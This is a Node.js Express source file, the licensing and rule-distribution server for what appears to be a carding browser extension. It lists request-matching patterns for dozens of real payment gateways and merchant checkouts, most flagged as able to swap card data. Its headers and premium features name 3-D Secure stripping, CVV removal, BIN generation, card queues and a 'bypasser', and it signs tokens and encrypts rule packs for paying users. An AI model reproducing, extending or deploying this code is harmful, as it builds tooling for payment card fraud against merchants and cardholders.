require('dotenv').config();
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const ALLOWED_HEADERS = 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-Install-Id, X-Client-Tag, X-License-Key, X-Request-Id, Accept-Language, X-Asheo-Target, X-Asheo-Method, X-Asheo-Install, X-Asheo-Ts, X-Asheo-Sig, X-Asheo-Build, X-Asheo-Nonce, X-Asheo-Origin, X-Asheo-Auth, X-Asheo-Bin, X-Asheo-Card, X-Asheo-Clientkey, X-Asheo-Special-Hosts, X-Asheo-Headers, X-Asheo-Swap-Only, X-Asheo-3ds-Strip, X-Asheo-Remove-Cvv, X-Asheo-Bt-Host, X-Asheo-Pack-Fmt';
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS);
  res.setHeader('Access-Control-Expose-Headers', 'Content-Length, X-Request-Id, X-Asheo-Proxied, X-Asheo-Swapped, X-Asheo-Swap-Ok');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.3.1');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
app.use(express.json({ limit: '1mb' }));

const C = { r:'\x1b[0m', b:'\x1b[1m', d:'\x1b[2m', gray:'\x1b[38;5;245m', dim:'\x1b[38;5;240m', violet:'\x1b[38;5;99m', violetB:'\x1b[38;5;135m', cyan:'\x1b[38;5;45m', cyanB:'\x1b[38;5;51m', gold:'\x1b[38;5;220m', goldB:'\x1b[38;5;226m', mint:'\x1b[38;5;121m', green:'\x1b[38;5;46m', rose:'\x1b[38;5;204m', red:'\x1b[38;5;196m', amber:'\x1b[38;5;214m', blue:'\x1b[38;5;39m' };
const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose };
function log(t, m) { const ts = new Date().toISOString().replace('T',' ').substring(0,19); const tag = (TAGS[t]||C.gray) + C.b + '▸ ' + t.padEnd(7) + C.r; console.log(`${C.dim}${ts}${C.r} ${tag} ${m}`); }
function banner() {
  console.log(`\n${C.violet}   ╭──────────────────────────────────────────────╮${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.3.1${C.r} ${C.dim}AURORA++${C.r}${C.violet}│${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · Asheo Systems${C.r}     ${C.violet}│${C.r}`);
  console.log(`${C.violet}   ╰──────────────────────────────────────────────╯${C.r}\n`);
}

let PRIVATE_KEY = null, PUBLIC_KEY = null, ORIGEM = 'nenhuma';
(function initKeys() {
  const fp = ['/etc/secrets/private.pem','./private.pem','/etc/secrets/ec_private.pem'];
  const fu = ['/etc/secrets/public.pem','./public.pem','/etc/secrets/ec_public.pem'];
  for (const f of fp) { try { if (fs.existsSync(f)) { PRIVATE_KEY = fs.readFileSync(f,'utf8').trim(); ORIGEM='file:'+f; break; } } catch {} }
  for (const f of fu) { try { if (fs.existsSync(f)) { PUBLIC_KEY = fs.readFileSync(f,'utf8').trim(); break; } } catch {} }
  if (!PRIVATE_KEY) { let p = process.env.EC_PRIVATE_KEY || process.env.JWT_PRIVATE_KEY_PEM || ''; if (p) { if (!p.includes('BEGIN')) { try { p = Buffer.from(p.trim(),'base64').toString('utf8'); } catch {} } PRIVATE_KEY = p.replace(/\\n/g,'\n').trim(); ORIGEM = 'env'; } }
  if (!PUBLIC_KEY) { let pu = process.env.EC_PUBLIC_KEY || process.env.JWT_PUBLIC_KEY_PEM || ''; if (pu) { if (!pu.includes('BEGIN')) { try { pu = Buffer.from(pu.trim(),'base64').toString('utf8'); } catch {} } PUBLIC_KEY = pu.replace(/\\n/g,'\n').trim(); } }
  if (PRIVATE_KEY) { try { const k = crypto.createPrivateKey(PRIVATE_KEY); const jwk = crypto.createPublicKey(k).export({ format:'jwk' }); if (!PUBLIC_KEY) PUBLIC_KEY = crypto.createPublicKey(k).export({ type:'spki', format:'pem' }); log('OK', `Chave privada carregada (${ORIGEM})`); if (jwk.x === 'aTAr_kSTrfocOkpAHlVSDc71E1pc5Pd5KgnE-ggBr_4' && jwk.y === 'GFrU897XAPvrxqcRhlwoAwpooKHl69-0YrBaJbfwAT4') { log('OK', '✔ Chave corresponde à extensão Mozlince'); } else { log('WARN', '⚠ Chave diferente da extensão'); } } catch (e) { log('ERRO','Chave inválida: '+e.message); PRIVATE_KEY = null; } } else { log('ERRO','Nenhuma chave privada encontrada'); }
})();

const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL;
const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const RULES_VERSION = 33;
const PAYMENT_RULES = [
  { defaultId:"stripe.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Stripe", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.stripe\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"worldpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Worldpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:hpp|payments|secure)\\.worldpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"endurance.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Endurance", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)securepay\\.svcs\\.endurance\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"safecharge.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Safecharge", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)secure\\.safecharge\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paddle.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Paddle", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout-service\\.paddle\\.com\\/[^?#]*\\/pay(?:[?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"adyen.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Adyen", patternEnc:{kind:"regex",source:"https:\\/\\/(?:checkoutshopper-live(?:-[a-z0-9]+)?\\.adyen\\.com|checkoutshopper-live(?:-[a-z0-9]+)?\\.cdn\\.adyen\\.com)\\/(?:checkoutshopper\\/)?v\\d+\\/(?:sessions\\/[^/]+\\/)?payments(?:\\/details)?(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"boosteroid.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Boosteroid Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)cloud\\.boosteroid\\.com\\/api\\/v2\\/payments\\/adyen\\/subscription\\/create(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"chess.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Chess.com Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)www\\.chess\\.com\\/payment\\/adyen\\/pay(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"gog.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"GOG Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.gog\\.com\\/v\\d+\\/checkout\\/[a-z0-9]+\\/payment(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"lootbar.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Lootbar", patternEnc:{kind:"regex",source:"api\\.lootbar\\.com\\/api\\/v2\\/asset\\/pay\\/adyen\\/card\\/request(?:[\\/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xsolla.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xsolla", patternEnc:{kind:"regex",source:"secure\\.xsolla\\.com\\/paystation2\\/api\\/.*$",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"recurly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Recurly", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:[a-z0-9.-]+\\.)?recurly\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tebex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Tebex", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout\\.tebex\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nordpayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NordPayments", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)iframe-api\\.nordpayments\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["primary_account_number","expiration_year","expiration_month","cvv"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"grammerly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Grammarly", patternEnc:{kind:"regex",source:"gr4vy\\.app|gateway\\.grammarly\\.com|payments\\.grammarly\\.com",flags:"i"}, matchContentType:"application/json", requiredKeys:["payment_method.number","payment_method.expiration_date","payment_method.security_code"], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"rizzup.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"RizzUp", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)rizzup\\.net(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"fortis.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Fortis", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.fortis\\.tech(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"jsbasistheory.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Basis Theory", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|js)\\.basistheory\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"braintree.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Braintree", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)payments\\.braintree-api\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"mercadopago.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Mercado Pago", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|sdk)\\.mercadopago\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xendit.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xendit", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api\\.xendit\\.co\\/v2\\/credit_card_tokens|pali-orchestrator-prod-live\\.xendit\\.co)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"razorpay.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Razorpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|checkout|cdn)\\.razorpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paystack.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Paystack", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:standard|api|checkout|js)\\.paystack\\.(?:co|com)(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"payu.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"PayU India", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:test|secure|info|uat-partner)\\.payu\\.in(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"epicgames.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Epic Games", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)payment-website-pci\\.ol\\.epicgames\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"appsnetpk.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"IPG (apps.net.pk)", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)ipg\\d*\\.apps\\.net\\.pk(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"primer.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Primer", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)sdk\\.api\\.primer\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bluesnap.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BlueSnap", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:www1\\.)?bluesnap\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["ccNumber"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bridgerpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BridgerPay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout\\.bridgerpay\\.com\\/api\\/(?:v2\\/deposit\\/credit-card|n\\/payment-details-cache)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"spreedly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Spreedly", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)core\\.spreedly\\.com\\/v1\\/payment_methods(\\/restricted\\.json)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"openpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Openpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:sandbox-)?api\\.openpay\\.(?:mx|co|pe|com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:secure\\.)?nmi\\.com\\/api\\/transact\\.php",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.collectjs", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI CollectJS", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:secure\\.)?nmi\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tailoredpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TailoredPay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)tailoredpay\\.transactiongateway\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"sagepay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Opayo (Sage Pay)", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:live|test|pi-live|pi-test)\\.sagepay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"viva.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Viva", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:demo-)?api\\.vivapayments\\.com\\/nativecheckout\\/v2\\/chargetokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"codapayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Codapayments", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api-tc|tc-api-card-sandbox)\\.codapayments\\.com\\/v1\\/(?:pub\\/)?direct\\/charges",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"checkout.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Checkout.com", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api\\.(?:sandbox\\.)?|card-acquisition-gateway\\.)checkout\\.com\\/tokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"airwallex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Airwallex", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:[a-z0-9-]+\\.)*airwallex\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tokenex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TokenEx", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)htp\\.tokenex\\.com\\/iframe\\/v3",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"cashfree.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Cashfree", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:sandbox\\.|api\\.|sdk\\.|payments\\.)?cashfree\\.com\\/(?:checkout\\/api\\/checkouts\\/payments\\/?)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"zuora.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Zuora", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)rest\\.(?:[a-z0-9-]+\\.)*zuora\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"vgs.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"VGS", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:vgsapi\\.com|[a-z0-9-]+\\.(?:sandbox|live)\\.verygoodproxy\\.com)\\/cards(?:[/?#]|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"patreon.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Patreon", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:www\\.)?patreon\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
];

const GATEWAYS_META = [
  {id:'default-stripe',name:'Stripe',pattern:'https://js.stripe.com/*',enabled:true,isDefault:true},
  {id:'default-checkout',name:'Checkout.com',pattern:'https://*.checkout.com/*',enabled:true,isDefault:true},
  {id:'default-adyen',name:'Adyen',pattern:'https://*.adyen.com/*',enabled:true,isDefault:true},
  {id:'default-braintree',name:'Braintree',pattern:'https://*.braintreegateway.com/*',enabled:true,isDefault:true}
];
const CAMPAIGNS = [];

const FEATURE_KEYS = ['browserMods','ruleOpsLab','liveHud','advancedProtection','apiAccess','experimentalFeatures'];
const CAPABILITY_KEYS = ['customEncryptedGateways','binGenerator'];
const LIMIT_KEYS = ['binPool','ccQueue','ruleLimit','profileLimit','randomRouting'];

const PREMIUM_FEATURES = { browser_mods:{enabled:true,label:'Browser Mods'}, rule_ops_lab:{enabled:true,label:'Rule Ops Lab'}, live_injection_hud:{enabled:true,label:'Live Injection HUD'}, algo_v2:{enabled:true,label:'Algo V2'}, exclusive_rules:{enabled:true,label:'Exclusive Rules'}, advanced_automation:{enabled:true,label:'Advanced Automation'}, multi_account:{enabled:true,label:'Multi Account'}, custom_export:{enabled:true,label:'Custom Export'}, api_access:{enabled:true,label:'API Access'} };
const PREMIUM_CAPABILITIES = { priority_support:{enabled:true,label:'Priority Support'}, custom_webhooks:{enabled:true,label:'Custom Webhooks'}, cloud_sync:{enabled:true,label:'Cloud Sync'}, bulk_actions:{enabled:true,label:'Bulk Actions'}, advanced_analytics:{enabled:true,label:'Advanced Analytics'} };
const PREMIUM_LIMITS = { max_accounts:-1, daily_actions:-1, max_templates:-1, history_days:-1, export_limit:-1 };
const FREE_LIMITS = { max_accounts:1, daily_actions:20, max_templates:3, history_days:3, export_limit:5 };
const PREMIUM_SCOPE = ['bypasser','cardfiller','cvv','premium','browserMods','persona','rules','gateways','exclusive'];
const mapFeatures = on => Object.fromEntries(Object.entries(PREMIUM_FEATURES).map(([k,v])=>[k,on?v.enabled:false]));
const mapCapabilities = on => Object.fromEntries(Object.entries(PREMIUM_CAPABILITIES).map(([k,v])=>[k,on?v.enabled:false]));

function buildEntitlement(lic, installId) {
  const isPremium = lic && lic.ativa && (lic.lifetime || lic.expiraEm > Date.now());
  const plano = lic ? lic.plano : 'free';
  const isTrial = plano === '3d' || (lic && lic.trial);
  const expiresAt = lic ? lic.expiraEm : null;
  const features = {};
  FEATURE_KEYS.forEach(k => { features[k] = isPremium ? true : false; });
  const capabilities = {};
  CAPABILITY_KEYS.forEach(k => { capabilities[k] = isPremium ? true : false; });
  const limits = {};
  LIMIT_KEYS.forEach(k => {
    if (k === 'binPool' || k === 'ccQueue' || k === 'ruleLimit' || k === 'profileLimit') limits[k] = isPremium ? null : (k === 'ccQueue' ? 10 : 2);
    else if (k === 'randomRouting') limits[k] = isPremium ? true : false;
  });
  return {
    tier: isPremium ? 'premium' : 'free',
    plan: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    planDisplayName: isPremium ? (isTrial ? 'Premium Trial' : 'Premium') : 'Free',
    licenseType: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    status: isPremium ? 'active' : 'inactive',
    source: lic ? 'license' : 'free',
    isFounder: false,
    activatedAt: lic ? lic.ativadaEm || lic.criadaEm : null,
    expiresAt: expiresAt,
    nextBillingDate: expiresAt,
    seatsAllowed: isPremium ? (lic.seatsAllowed || 999999) : 1,
    seatsUsed: lic ? (lic.seatsUsed || 1) : 0,
    activationCount: lic ? (lic.activationCount || 1) : 0,
    maxActivations: null,
    currentDeviceId: lic && lic.installId ? lic.installId : null,
    deviceLocked: lic && lic.installId ? true : false,
    canTransfer: false,
    features, featureKeys: FEATURE_KEYS,
    customFeatures: {},
    capabilities, capabilityKeys: CAPABILITY_KEYS,
    limits, limitKeys: LIMIT_KEYS,
    metadata: lic ? { trial: isTrial, trialHours: isTrial ? 36 : null } : {}
  };
}

function encryptPack(data, keyBase64) {
  const key = Buffer.from(keyBase64, 'base64');
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  const ct = Buffer.concat([encrypted, tag]).toString('base64');
  return { ct, nonce: nonce.toString('base64'), v: RULES_VERSION };
}

const provCache = new Map();
function generateProv(installId) {
  if (!PRIVATE_KEY) return null;
  if (!installId || typeof installId !== 'string') installId = 'default';
  const cached = provCache.get(installId);
  if (cached && (Date.now() - cached.ts) < 55 * 60 * 1000) return cached.prov;
  try {
    const prov = jwt.sign({ sub: installId, jti: crypto.randomUUID(), iat: Math.floor(Date.now() / 1000) }, PRIVATE_KEY, { algorithm: 'ES256', expiresIn: '1h' });
    provCache.set(installId, { prov, ts: Date.now() });
    return prov;
  } catch (e) { log('ERRO', 'generateProv: ' + e.message); return null; }
}

function buildGwPass(installId) {
  if (!PRIVATE_KEY) return null;
  const now = Math.floor(Date.now() / 1000);
  return jwt.sign({ sub: installId, purpose: 'gw-pass', iat: now, exp: now + 3600, jti: crypto.randomUUID() }, PRIVATE_KEY, { algorithm: 'ES256' });
}

function normalizeKey(k){ if(!k||typeof k!=='string')return ''; return k.trim().toUpperCase().replace(/\s+/g,'').replace(/[^A-Z0-9\-]/g,''); }
async function redisSet(key, value) { const k = encodeURIComponent(normalizeKey(key)); const r = await fetch(`${UPSTASH_URL}/set/${k}`, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}`, 'Content-Type':'text/plain' }, body: typeof value === 'string' ? value : JSON.stringify(value) }); return r.json(); }
async function redisGet(key) { const k = encodeURIComponent(normalizeKey(key)); if (!k) return null; const r = await fetch(`${UPSTASH_URL}/get/${k}`, { headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); const d = await r.json(); if (!d.result) return null; try { return migrarLicenca(JSON.parse(d.result)); } catch { return null; } }
async function redisDel(key) { const k = encodeURIComponent(normalizeKey(key)); await fetch(`${UPSTASH_URL}/del/${k}`, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); }
async function redisKeys(pattern='ASHEO-*') { const p = encodeURIComponent(pattern); const r = await fetch(`${UPSTASH_URL}/keys/${p}`, { headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); const d = await r.json(); return (d.result || []).filter(k => typeof k === 'string'); }

